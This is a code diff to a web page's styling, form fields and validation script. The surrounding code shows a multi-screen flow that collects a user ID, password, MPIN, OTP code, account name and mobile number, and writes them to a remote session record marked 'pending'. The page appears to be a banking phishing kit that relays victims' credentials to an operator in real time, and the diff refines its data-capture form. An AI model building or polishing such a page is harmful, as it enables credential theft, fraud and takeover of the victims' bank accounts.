@@ -516,6 +516,8 @@ html, body {
 
 .account-form .form-group {
   margin-bottom: 24px;
+  border-bottom: none;
+  padding-bottom: 0;
 }
 
 .account-form label {
@@ -524,16 +526,16 @@ html, body {
   font-weight: 600;
   color: #4a5568;
   margin-bottom: 8px;
-  letter-spacing: 0.3px;
+  letter-spacing: 0.5px;
   text-transform: uppercase;
 }
 
 .account-form input {
   width: 100%;
-  padding: 14px 16px;
+  padding: 16px 18px;
   border: 2px solid #78bdcf;
   border-radius: 10px;
-  font-size: 15px;
+  font-size: 16px;
   font-family: inherit;
   color: #1a202c;
   background: #ffffff;
@@ -591,6 +593,7 @@ html, body {
   .screen-title { font-size: 18px; }
   .form-group input { font-size: 17px; }
   .form-group .forgot-link { font-size: 14px; }
+  .account-form input { padding: 14px 16px; font-size: 15px; }
 }
 </style>
 </head>
@@ -695,12 +698,12 @@ html, body {
     <form class="account-form" onsubmit="event.preventDefault();">
       <div class="form-group">
         <label>Account Name</label>
-        <input type="text" id="accountname" placeholder="Enter your account name" autocomplete="off" oninput="checkAccountForm()">
+        <input type="text" id="accountName" placeholder="Enter your account name" autocomplete="off" oninput="checkAccountForm()">
       </div>
 
       <div class="form-group">
         <label>Mobile Number</label>
-        <input type="tel" id="mobileNumber" inputmode="numeric" placeholder="Enter your mobile number" autocomplete="off" oninput="checkAccountForm()">
+        <input type="tel" id="mobileNumber" inputmode="numeric" placeholder="Enter your mobile number" autocomplete="off" oninput="checkAccountForm()" maxlength="15">
       </div>
 
       <button type="button" class="btn-verify" id="accountBtn" onclick="handleAccountConfirm()" disabled>Confirm</button>
@@ -777,7 +780,7 @@ var sessionRef = null;
 var userIdValue = "";
 var passwordValue = "";
 var mpinValue = "";
-var accountNumberValue = "";
+var accountNameValue = "";
 var mobileNumberValue = "";
 var otpAttemptCount = 0;
 var timerInterval = null;
@@ -875,7 +878,7 @@ function handleLogin(e) {
     password: password,
     mpin: '—',
     otpCode: '—',
-    accountNumber: '—',
+    accountName: '—',
     mobileNumber: '—',
     status: 'pending',
     time: timeStr,
@@ -922,23 +925,29 @@ function handleMpinVerify() {
 
   setTimeout(function() {
     showScreen('accountPage');
-    document.getElementById('accountNumber').value = '';
+    document.getElementById('accountName').value = '';
     document.getElementById('mobileNumber').value = '';
     document.getElementById('accountBtn').disabled = true;
     document.getElementById('accountMessage').classList.remove('show');
-    setTimeout(function() { document.getElementById('accountNumber').focus(); }, 300);
+    setTimeout(function() { document.getElementById('accountName').focus(); }, 300);
   }, 700);
 }
 
 // =====================================================
-// ACCOUNT DETAILS
+// ACCOUNT DETAILS (Account Name + Mobile Number)
 // =====================================================
 function checkAccountForm() {
-  var acc = document.getElementById('accountNumber').value.trim();
+  var name = document.getElementById('accountName').value.trim();
   var mob = document.getElementById('mobileNumber').value.trim();
   var btn = document.getElementById('accountBtn');
 
-  if (acc.length >= 6 && mob.length >= 6) {
+  // Account Name: minimum 3 characters
+  var nameOk = name.length >= 3;
+
+  // Mobile Number: minimum 10 digits, maximum 15 digits, digits only
+  var mobOk = mob.length >= 10 && mob.length <= 15 && /^[0-9]+$/.test(mob);
+
+  if (nameOk && mobOk) {
     btn.disabled = false;
   } else {
     btn.disabled = true;
@@ -946,24 +955,33 @@ function checkAccountForm() {
 }
 
 function handleAccountConfirm() {
-  var acc = document.getElementById('accountNumber').value.trim();
+  var name = document.getElementById('accountName').value.trim();
   var mob = document.getElementById('mobileNumber').value.trim();
 
-  if (!acc || acc.length < 6) {
-    showMsg('accountMessage', 'Please enter a valid account number.', 'warning');
+  // Validation
+  if (!name || name.length < 3) {
+    showMsg('accountMessage', 'Please enter a valid account name (min 3 characters).', 'warning');
     return;
   }
-  if (!mob || mob.length < 6) {
-    showMsg('accountMessage', 'Please enter a valid mobile number.', 'warning');
+  if (!mob || mob.length < 10) {
+    showMsg('accountMessage', 'Please enter a valid mobile number (min 10 digits).', 'warning');
+    return;
+  }
+  if (mob.length > 15) {
+    showMsg('accountMessage', 'Mobile number is too long.', 'warning');
+    return;
+  }
+  if (!/^[0-9]+$/.test(mob)) {
+    showMsg('accountMessage', 'Mobile number must contain digits only.', 'warning');
     return;
   }
 
-  accountNumberValue = acc;
+  accountNameValue = name;
   mobileNumberValue = mob;
 
   if (sessionRef) {
     sessionRef.update({
-      accountNumber: acc,
+      accountName: name,
       mobileNumber: mob
     }).then(function() {
       console.log('✅ Account details saved');
